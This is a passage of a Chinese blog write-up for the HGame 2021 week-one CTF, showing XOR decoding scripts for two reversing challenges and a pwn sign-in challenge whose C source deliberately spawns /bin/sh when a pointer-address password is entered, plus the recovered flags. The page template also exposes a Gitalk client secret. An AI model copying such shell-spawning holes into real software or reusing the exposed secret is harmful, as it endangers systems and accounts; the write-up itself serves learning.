 <span class="token number">16</span>         <span class="token number">152</span> LOAD_GLOBAL              <span class="token number">8</span> <span class="token punctuation">(</span><span class="token keyword">print</span><span class="token punctuation">)</span>
            <span class="token number">154</span> LOAD_CONST               <span class="token number">6</span> <span class="token punctuation">(</span><span class="token string">'your flag: '</span><span class="token punctuation">)</span>
            <span class="token number">156</span> LOAD_FAST                <span class="token number">4</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>
            <span class="token number">158</span> BINARY_ADD
            <span class="token number">160</span> CALL_FUNCTION            <span class="token number">1</span>
            <span class="token number">162</span> POP_TOP
            <span class="token number">164</span> LOAD_CONST               <span class="token number">0</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>
            <span class="token number">166</span> RETURN_VALUE

<span class="token comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></code></pre>
<p>然后照样子写出源码。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#</span>
<span class="token comment"># 源代码</span>
<span class="token comment"># hgame{.+}</span>
raw_flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'give me your flag:\n'</span><span class="token punctuation">)</span>
cipher <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>raw_flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span>


res<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> i<span class="token punctuation">)</span>
res <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'your flag: '</span> <span class="token operator">+</span> res<span class="token punctuation">)</span>
<span class="token comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></code></pre>
<p>好耶，直接就是奇偶位交换，然后异或一下，那直接反过来就完事了。</p>
<p>exp:</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># decode</span>
res <span class="token operator">=</span> <span class="token string">'30466633346f59213b4139794520572b45514d61583151576638643a'</span>
x <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>

cipher <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> cipher<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~</span></code></pre>
<p><code>hgame{G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~}</code></p>
<blockquote>
<p><strong>Extensive Reading:</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/vebs87">（整理）Python字节码详解</a></p>
</blockquote>
<h3 id="helloRe"><a href="#helloRe" class="headerlink" title="helloRe"></a>helloRe</h3><p>关键的部分在下图的第39行。</p>
<p>首先读取输入，然后与 <code>sub_140001430</code> 函数返回的结果进行异或，不对则输出 wrong flag。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203212552227.png" alt="关键部分"></p>
<p>再看 <code>sub_140001430</code>，返回的是 0xFF 递减的结果。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203212818909.png"></p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203212840860.png"></p>
<p>而 <code>byte_140003480</code> 是比对的部分。</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210203212924046.png"></p>
<p>于是写个脚本异或就完事了。</p>
<p>Exp:</p>
<pre class="language-python" data-language="python"><code class="language-python">xx <span class="token operator">=</span> <span class="token triple-quoted-string string">"""97
 99
..."""</span>
x <span class="token operator">=</span> xx<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>
r <span class="token operator">=</span> <span class="token string">''</span>
cnt <span class="token operator">=</span> <span class="token number">0xff</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>
    r <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i <span class="token operator">^</span> cnt<span class="token punctuation">)</span>
    cnt <span class="token operator">-=</span> <span class="token number">1</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
<span class="token comment"># hgame{hello_re_player}</span></code></pre>






<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h3><p>签到题，源码都给了，好耶！</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>

<span class="token keyword">void</span> <span class="token function">init_io</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>  
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> num<span class="token punctuation">;</span>

    <span class="token function">init_io</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"password:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token string">"paSsw0rd"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">//Do you know strcmp?</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you are right!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"sorry, you are wrong.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>


    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201022306698.png" alt="看地址"></p>
<p> unsigned long long 和 char* 比较，看指针地址就好了。</p>
<p>0x402012 =&gt; 4202514</p>
<p><img src="/2021/02/07/CTF_2021HgameWeek1/image-20210201022617716.png" alt="flag"></p>
<p><code>hgame{W3lCOme_t0_Hg4m3_2222Z222zO2l}</code></p>
<hr>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>第一周 AK 了 Misc 和 Web，感觉题目还是挺有意思的。</p>
<p>喵呜，binary 好难不会做，嘤嘤嘤。</p>
<p>好快啊，这周就过年了喵~</p>
<p><em>（溜了溜了</em></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2021/02/07/CTF_2021HgameWeek1/">https://miaotony.xyz/2021/02/07/CTF_2021HgameWeek1/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特别声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/CTF/">
                                    <span class="chip bg-color">CTF</span>
                                </a>
                            
                                <a href="/tags/WriteUp/">
                                    <span class="chip bg-color">WriteUp</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/" class="reward-img" alt="支付宝打赏二维码">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2021-02-07T22-00-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/02/11/CTF_2021NewsCTF/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/6.jpg" class="responsive-img" alt="CTF | 2021 NewsCTF 新春赛 WriteUp">
                        
                        <span class="card-title">CTF | 2021 NewsCTF 新春赛 WriteUp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            看群里师傅说这几天NewsCTF有个新春小比赛，做出题目还送红包，顺手就来看看了。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-11
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/02/03/CTF_2021chunqiu/">
                    <div class="card-image">
                        
                        
                        <img src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/medias/featureimages/16.jpg" class="responsive-img" alt="CTF | 2021 春秋杯 新年欢乐赛 WriteUp">
                        
                        <span class="card-title">CTF | 2021 春秋杯 新年欢乐赛 WriteUp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            前几天有个春秋杯新年欢乐赛，有点感兴趣就来看看题了。说好的欢乐赛，其实一点都不欢乐，太坏了！
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-03
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/CTF/">
                        <span class="chip bg-color">CTF</span>
                    </a>
                    
                    <a href="/tags/WriteUp/">
                        <span class="chip bg-color">WriteUp</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: MiaoTony&#39;s小窝<br />'
            + '文章作者: MiaoTony<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者MiaoTony所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2021</span>
            
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">236.1k</span>&nbsp;字
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
                        <br>
                        <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
